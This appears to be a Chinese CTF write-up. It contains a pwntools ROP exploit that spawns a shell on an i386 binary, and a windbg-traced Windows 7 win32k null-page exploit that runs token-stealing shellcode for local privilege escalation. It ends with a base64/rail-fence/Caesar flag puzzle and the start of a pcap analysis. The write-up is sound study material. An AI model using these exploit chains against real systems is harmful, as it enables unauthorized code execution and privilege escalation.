    from pwn import*
    import time
    def pwn(io):
    #offset info
    if is_local:
    #local
    offset_system = 0x0
    offset_binsh = 0x0
    else:
    #remote
    offset_system = 0x0
    offset_binsh = 0x0
    io.read_until("]")
    dl_mk_stack_exe = 0x080A0AF0
    context(arch = 'i386', os = 'linux')
    shellcode = asm(shellcraft.i386.sh())
    #0x080e77dc : add ebx, esp ; add dword ptr [edx], ecx ; ret
    add_ebx_esp = 0x080e77dc
    #0x080481c9 : pop ebx ; ret
    p_ebx_ret = 0x080481c9
    #0x0804f2ea : mov eax, ebx ; pop ebx ; ret
    mov_eax_ebx_p_ret = 0x0804f2ea
    #0x0806cbb5 : int 0x80
    p_eax_ret = 0x080b89e6
    p_ebx_ret = 0x080481c9
    p_ecx_ret = 0x080df1b9
    p_edx_ret = 0x0806efbb
    int80_addr = 0x0806cbb5
    read_addr = 0x0806D510
    bss_addr = 0x080ece00
    payload = ""
    payload += "a"*0x3a
    payload += l32(0)
    payload += gen_rop_data(read_addr, [0, bss_addr, 8])
    payload += l32(p_eax_ret)
    payload += l32(0xb)
    payload += l32(p_ebx_ret)
    payload += l32(bss_addr)
    payload += l32(p_ecx_ret)
    payload += l32(0)
    payload += l32(p_edx_ret)
    payload += l32(0)
    payload += l32(int80_addr)
    io.writeline(str(1000))
    io.read_until("]")
    io.gdb_hint()
    io.writeline(payload)
    io.read_until("]")
    time.sleep(1)
    io.writeline("/bin/shx00")
    io.interact()
    io.interact()
    io = get_io(target)
    pwn(io)
**flag如下：**
**Pwn450 本地提权**
这是一个由于PDEV未初始化引用导致的漏洞，首先修改poc，并且运行，用windbg的pipe功能远程调试win7 ，会捕获到漏洞触发位置。
    kd> r
    eax=00000000 ebx=980b0af8 ecx=00000001 edx=00000000 esi=00000000 edi=fe9950d8
    eip=838b0560 esp=980b0928 ebp=980b09a0 iopl=0         nv up ei pl zr na pe nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
    win32k!bGetRealizedBrush+0x38:
    838b0560 f6402401        test    byte ptr [eax+24h],1       ds:0023:00000024=??
这个位置eax引用了0x0，需要跟踪这个eax由什么地方得到，首先分析win32k!bGetRealizedBrush函数。
    int __stdcall bGetRealizedBrush(struct BRUSH *a1, struct EBRUSHOBJ *a2, int (__stdcall *a3)(struct _BRUSHOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _XLATEOBJ *, unsigned __int32))
    {
函数定义了3个变量，其中a3是EngRealizeBrush函数，a1是一个BRUSH结构体，a2是一个EBRUSHOBJ结构体，而漏洞触发位置的eax就由EBRUSHOBJ结构体得来，跟踪分析一下这个过程。
    kd> p
    win32k!bGetRealizedBrush+0x1c://ebx由第二个参数得来
    969e0544 8b5d0c          mov     ebx,dword ptr [ebp+0Ch]
    ……
    kd> p
    win32k!bGetRealizedBrush+0x25://第二个参数+34h的位置的值交给eax
    969e054d 8b4334          mov     eax,dword ptr [ebx+34h]
    ……
    kd> p
    win32k!bGetRealizedBrush+0x32://eax+1c的值，交给eax，这个值为0
    969e055a 8b401c          mov     eax,dword ptr [eax+1Ch]
    kd> p
    win32k!bGetRealizedBrush+0x35:
    969e055d 89450c          mov     dword ptr [ebp+0Ch],eax
    kd> p
    win32k!bGetRealizedBrush+0x38://eax为0，引发无效内存访问
    969e0560 f6402401        test    byte ptr [eax+24h],1
经过上面的分析，我们需要知道，EBRUSHOBJ+34h位置存放着什么样的值，直接来看EBRUSHOBJ结构体的内容。
    kd> dd 8effcaf8
    8effcaf8  ffffffff 00000000 00000000 00edfc13
    8effcb08  00edfc13 00000000 00000006 00000004
    8effcb18  00000000 00ffffff fe96b7c4 00000000
    8effcb28  00000000 fd2842e8 ffbff968 ffbffe68
这里+34h位置存放的值是fd2842e8，而fd2842e8+1c存放的是
    kd> dd fd2842e8
    fd2842e8  108501ef 00000001 80000000 874635f8
    fd2842f8  00000000 108501ef 00000000 00000000
    fd284308  00000008 00000008 00000020 fd28443c
    fd284318  fd28443c 00000004 00001292 00000001
这里对象不明朗没关系，来看一下+1c位置存放的是什么样的结构，通过kb堆栈回溯（这里由于多次重启堆栈地址发生变化，不影响调试）
    kd> kb
     # ChildEBP RetAddr  Args to Child              
    00 980b09a0 838b34af 00000000 00000000 838ad5a0 win32k!bGetRealizedBrush+0x38
    01 980b09b8 83929b5e 980b0af8 00000001 980b0a7c win32k!pvGetEngRbrush+0x1f
    02 980b0a1c 839ab6e8 fe975218 00000000 00000000 win32k!EngBitBlt+0x337
    03 980b0a54 839abb9d fe975218 980b0a7c 980b0af8 win32k!EngPaint+0x51
    04 980b0c20 83e941ea 00000000 ffbff968 1910076b win32k!NtGdiFillRgn+0x339
跟踪外层函数调用，在NtGdiFillRgn函数中
                EngPaint(
                  (struct _SURFOBJ *)(v5 + 16),
                  (int)&v13,
                  (struct _BRUSHOBJ *)&v18,
                  (struct _POINTL *)(v42 + 1592),
                  v10);                             // 进这里
传入的第一个参数是SURFOBJ对象，来看一下这个对象的内容
    kd> p
    win32k!NtGdiFillRgn+0x334:
    96adbb98 e8fafaffff      call    win32k!EngPaint (96adb697)
    kd> dd esp
    903fca5c  ffb58778 903fca7c 903fcaf8 ffaabd60
第一个参数SURFOBJ的值是ffb58778，继续往后跟踪
    kd> p
    win32k!EngPaint+0x45:
    96adb6dc ff7508          push    dword ptr [ebp+8]
    kd> p
    win32k!EngPaint+0x48:
    96adb6df 8bc8            mov     ecx,eax
    kd> p
    win32k!EngPaint+0x4a:
    96adb6e1 e868e4f8ff      call    win32k!SURFACE::pfnBitBlt (96a69b4e)
    kd> dd 903fcaf8
    903fcaf8  ffffffff 00000000 00000000 00edfc13
    903fcb08  00edfc13 00000000 00000006 00000004
    903fcb18  00000000 00ffffff ffaab7c4 00000000
    903fcb28  00000000 ffb58768 ffbff968 ffbffe68
    903fcb38  ffbbd540 00000006 fe57bc38 00000014
    903fcb48  000000d3 00000001 ffffffff 83f77f01
    903fcb58  83ec0892 903fcb7c 903fcbb0 00000000
    903fcb68  903fcc10 83e17924 00000000 00000000
    kd> dd ffb58768
    ffb58768  068501b7 00000001 80000000 8754b030
    ffb58778  00000000 068501b7 00000000 00000000
    ffb58788  00000008 00000008 00000020 ffb588bc
发现在EBRUSHOBJ+34h位置存放的值，再+10h存放的正是之前的SURFOBJ，也就是说，之前ffb58768+1ch位置存放的就是SURFOBJ+0xc的值，而这个值来看一下SURFOBJ的结构
    typedef struct _SURFOBJ {
      DHSURF dhsurf;
      HSURF  hsurf;
      DHPDEV dhpdev;
      HDEV   hdev;
      SIZEL  sizlBitmap;
      ULONG  cjBits;
      PVOID  pvBits;
      PVOID  pvScan0;
      LONG   lDelta;
      ULONG  iUniq;
      ULONG  iBitmapFormat;
      USHORT iType;
      USHORT fjBitmap;
    } SURFOBJ;
这个位置存放的是hdev对象，正是因为未对这个对象进行初始化直接引用，导致了漏洞的发生。
漏洞利用时，在win32k!bGetRealizedBrush找到一处调用
    .text:BF840810 loc_BF840810:                           ; CODE XREF: bGetRealizedBrush(BRUSH *,EBRUSHOBJ *,int (*)(_BRUSHOBJ *,_SURFOBJ *,_SURFOBJ *,_SURFOBJ *,_XLATEOBJ *,ulong))+2E0j
    .text:BF840810                 mov     ecx, [ebp+P]
    .text:BF840813                 mov     ecx, [ecx+2Ch]
    .text:BF840816                 mov     edx, [ebx+0Ch]
    .text:BF840819                 push    ecx
    .text:BF84081A                 push    edx
    .text:BF84081B                 push    [ebp+var_14]
    .text:BF84081E                 push    eax
    .text:BF84081F                 call    edi             ;
利用call edi可以跳转到我们要的位置，edi来自于a2，也就是未初始化对象赋值，因此我们可以控制这个值，接下来看看利用过程。
利用这个未初始化的对象，可以直接利用零页内存绕过限制，有几处跳转，第一处
          v20 = a2;//v20赋值
          if ( *((_DWORD *)a2 + 284) & 0x200000 && (char *)a3 != (char *)EngRealizeBrush )
          {
            v21 = *((_DWORD *)v5 + 13);
            if ( v21 )
              v22 = (struct _SURFOBJ *)(v21 + 16);
            else
              v22 = 0;
            if ( a3(v5, v22, 0, 0, 0, *((_DWORD *)v5 + 3) | 0x80000000) )// come to this?
            {
              v19 = 1;
              goto LABEL_24;
            }
            v20 = a2;//v20赋值
          }
          v23 = *((_WORD *)v20 + 712);
          if ( !v23 )//这里有一个if语句跳转
            goto LABEL_23;
这时候v20的值是a2，而a2的值来自于 a2 = *(struct EBRUSHOBJ **)(v6 +
28);，之前已经分析过，由于未初始化，这个值为0
那么第一处在v23的if语句跳转中，需要置0+0x590位置的值为不为0的数。
第二处在
          v24 = (struct EBRUSHOBJ *)((char *)v20 + 1426);
          if ( !*(_WORD *)v24 )
            goto LABEL_23;
这个地方又要一个if语句跳转，这个地方需要置0x592位置的值为不为0的数。
最后一处，也就是call edi之前的位置
    .text:BF8407F0                 mov     edi, [eax+748h]//edi赋值为跳板值
    .text:BF8407F6                 setz    cl
    .text:BF8407F9                 inc     ecx
    .text:BF8407FA                 mov     [ebp+var_14], ecx
    .text:BF8407FD ; 134:       if ( v26 )
    .text:BF8407FD                 cmp     edi, esi//这里仍旧是和0比较
    .text:BF8407FF                 jz      short loc_BF840823
这个地方需要edi和esi做比较，edi不为0，这里赋值为替换token的shellcode的值就是不为0的值了，直接可以跳转。
因此，需要在源码中构造这三个位置的值。
    void* bypass_one = (void *)0x590;
    *(LPBYTE)bypass_one = 0x1;
    void* bypass_two = (void *)0x592;
    *(LPBYTE)bypass_two = 0x1;
    void* jump_addr = (void *)0x748;
    *(LPDWORD)jump_addr = (DWORD)TokenStealingShellcodeWin7;
最后替换system token即可完成利用
**杂项**
**Misc50 签到**
**题面：** Z2dRQGdRMWZxaDBvaHRqcHRfc3d7Z2ZoZ3MjfQ==
    >>> import base64
    >>> str = 'Z2dRQGdRMWZxaDBvaHRqcHRfc3d7Z2ZoZ3MjfQ=='
    >>> base64.b64decode(str)
    'ggQ@gQ1fqh0ohtjpt_sw{gfhgs#}
解base64得
    ggQ@gQ1fqh0ohtjpt_sw{gfhgs#}
解栅栏得
    ggqht{ggQht_gsQ10jsf#@fopwh}
解凯撒加密得
    ssctf{ssCtf_seC10ver#@rabit}
**Misc100 flag在哪里**
分析下流量包： [Expert Info (Chat/Sequence): GET /.nijiakadaye/info/refs?service=git-upload-pack HTTP/1.1rn]
发现这是一些git文件